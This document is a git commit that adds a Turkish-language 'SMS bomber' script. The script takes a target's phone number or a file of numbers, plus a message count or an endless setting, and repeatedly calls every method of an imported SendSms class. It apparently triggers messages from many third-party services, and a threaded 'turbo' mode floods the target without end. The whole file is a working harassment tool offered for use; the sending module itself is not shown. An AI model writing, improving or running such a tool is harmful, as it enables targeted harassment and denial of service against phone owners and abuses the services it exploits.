dbaa695d6e78199d3f9095896680b2bab8a012d0
Casper <mdenizcako2@gmail.com>
2025-11-30 22:01:43 +0300

    SMS BOMBER ++++
    HER HAFTA GUNCELLEME ALCAK
    SAADECE TURKİYE İÇİN GEÇERLİ

---
+++ smsbomb.py
@@ -0,0 +1,232 @@
+from colorama import Fore, Style
+from time import sleep
+from os import system
+from sms import SendSms
+import threading
+
+servisler_sms = []
+for attribute in dir(SendSms):
+    attribute_value = getattr(SendSms, attribute)
+    if callable(attribute_value):
+        if attribute.startswith('__') == False:
+            servisler_sms.append(attribute)
+
+import sys,time
+def slowprint(s):
+    for c in s + '\n' :
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(10 / 10000)
+slowprint('''\033[92m
+XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
+XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
+XX   MMMMMy''                                                    ''yMMMMM   XX
+XX   MMMy'                                                          'yMMM   XX
+XX   Mh'                                                              'hM   XX
+XX   -                                                                  -   XX
+XX                                                                          XX
+XX   ::                                                                ::   XX
+XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
+XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
+XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
+XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
+XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
+XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
+XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
+XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
+XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
+XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
+XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
+XX                                oo      oo                                XX
+XX           oM                 oo          oo                 Mo           XX
+XX         oMMo                M              M                oMMo         XX
+XX       +MMMM                 s              s                 MMMM+       XX
+XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
+XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
+XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
+XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
+XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
+XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
+XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
+XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
+XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
+XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
+XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
+XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
+XX   MMMMMMMM-                                                  -MMMMMMMM   XX
+XX   MMMMMMMMM                                                  MMMMMMMMM   XX
+XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
+XX   MMMMMMMMMMy.       SOCIETY IS BORN TO BE F**KED         .yMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMy. GİTHUB PAGE: github.com/Casper2CR      .yMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMss.                          .ssMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMsss.                        .sssMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMMMNoo......................ooNMMMMMMMMMMMMMMMMMMMM   XX
+''')
+(input)
+
+
+           
+while 1:
+    system("cls||clear")
+    print("""{}
+
+  ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░       
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      
+░▒▓█▓▒░      ░▒▓████████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░       
+░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      
+ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░      
+                                                                                     
+                                                                                     
+    Sms: {}           {}by {}@Casperbaba\n  
+    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
+    try:
+        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (YAVAŞ)\n\n 2- SMS Gönder (TURBO)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
+        if menu == "":
+            continue
+        menu = int(menu) 
+    except ValueError:
+        system("cls||clear")
+        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
+        sleep(3)
+        continue
+    if menu == 1:
+        system("cls||clear")
+        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
+        tel_no = input()
+        tel_liste = []
+        if tel_no == "":
+            system("cls||clear")
+            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
+            dizin = input()
+            try:
+                with open(dizin, "r", encoding="utf-8") as f:
+                    for i in f.read().strip().split("\n"):
+                        if len(i) == 10:
+                            tel_liste.append(i)
+                sonsuz = ""
+            except FileNotFoundError:
+                system("cls||clear")
+                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
+                sleep(3)
+                continue
+        else:
+            try:
+                int(tel_no)
+                if len(tel_no) != 10:
+                    raise ValueError
+                tel_liste.append(tel_no)
+                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
+            except ValueError:
+                system("cls||clear")
+                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+                sleep(3)
+                continue
+        system("cls||clear")
+        try:
+            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
+            mail = input()
+            if ("@" not in mail or ".com" not in mail) and mail != "":
+                raise
+        except:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
+            sleep(3)
+            continue
+        system("cls||clear")
+        try:
+            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
+            kere = input()
+            if kere:
+                kere = int(kere)
+            else:
+                kere = None
+        except ValueError:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
+            sleep(3)
+            continue
+        system("cls||clear")
+        try:
+            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
+            aralik = int(input())
+        except ValueError:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
+            sleep(3)
+            continue
+        system("cls||clear")
+        if kere is None: 
+            sms = SendSms(tel_no, mail)
+            while True:
+                for attribute in dir(SendSms):
+                    attribute_value = getattr(SendSms, attribute)
+                    if callable(attribute_value):
+                        if attribute.startswith('__') == False:
+                            exec("sms."+attribute+"()")
+                            sleep(aralik)
+        for i in tel_liste:
+            sms = SendSms(i, mail)
+            if isinstance(kere, int):
+                    while sms.adet < kere:
+                        for attribute in dir(SendSms):
+                            attribute_value = getattr(SendSms, attribute)
+                            if callable(attribute_value):
+                                if attribute.startswith('__') == False:
+                                    if sms.adet == kere:
+                                        break
+                                    exec("sms."+attribute+"()")
+                                    sleep(aralik)
+        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
+        input()
+    elif menu == 3:
+        system("cls||clear")
+        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
+        break
+    elif menu == 2:
+        system("cls||clear")
+        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
+        tel_no = input()
+        try:
+            int(tel_no)
+            if len(tel_no) != 10:
+                raise ValueError
+        except ValueError:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
+            sleep(3)
+            continue
+        system("cls||clear")
+        try:
+            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
+            mail = input()
+            if ("@" not in mail or ".com" not in mail) and mail != "":
+                raise
+        except:
+            system("cls||clear")
+            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
+            sleep(3)
+            continue
+        system("cls||clear")
+        send_sms = SendSms(tel_no, mail)
+        dur = threading.Event()
+        def Turbo():
+            while not dur.is_set():
+                thread = []
+                for fonk in servisler_sms:
+                    t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
+                    thread.append(t)
+                    t.start()
+                for t in thread:
+                    t.join()
+        try:
+            Turbo()
+        except KeyboardInterrupt:
+            dur.set()
+            system("cls||clear")
+            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
+            sleep(2)
